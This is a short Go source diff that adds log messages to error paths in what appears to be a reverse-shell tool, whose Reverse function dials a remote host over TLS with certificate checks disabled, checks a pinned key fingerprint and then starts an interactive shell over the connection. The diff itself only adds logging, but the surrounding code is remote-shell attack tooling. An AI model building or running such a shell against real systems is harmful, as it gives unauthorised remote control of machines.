@@ -6,6 +6,7 @@ import (
 	"crypto/sha256"
 	"crypto/tls"
 	"encoding/hex"
+	"log"
 	"net"
 	"os"
 	"os/exec"
@@ -100,12 +101,14 @@ func Reverse(connectString string, fingerprint []byte) {
 	)
 	config := &tls.Config{InsecureSkipVerify: true}
 	if conn, err = tls.Dial("tcp", connectString, config); err != nil {
+		log.Println("ERR: Host unreachable", connectString)
 		os.Exit(ERR_HOST_UNREACHABLE)
 	}
 
 	defer conn.Close()
 
 	if ok, err := CheckKeyPin(conn, fingerprint); err != nil || !ok {
+		log.Println("ERR: Bad fingerprint")
 		os.Exit(ERR_BAD_FINGERPRINT)
 	}
 	InteractiveShell(conn)
@@ -116,6 +119,7 @@ func main() {
 		fprint := strings.Replace(fingerPrint, ":", "", -1)
 		bytesFingerprint, err := hex.DecodeString(fprint)
 		if err != nil {
+			log.Println("Could not decode fingerprint.")
 			os.Exit(ERR_COULD_NOT_DECODE)
 		}
 		Reverse(connectString, bytesFingerprint)
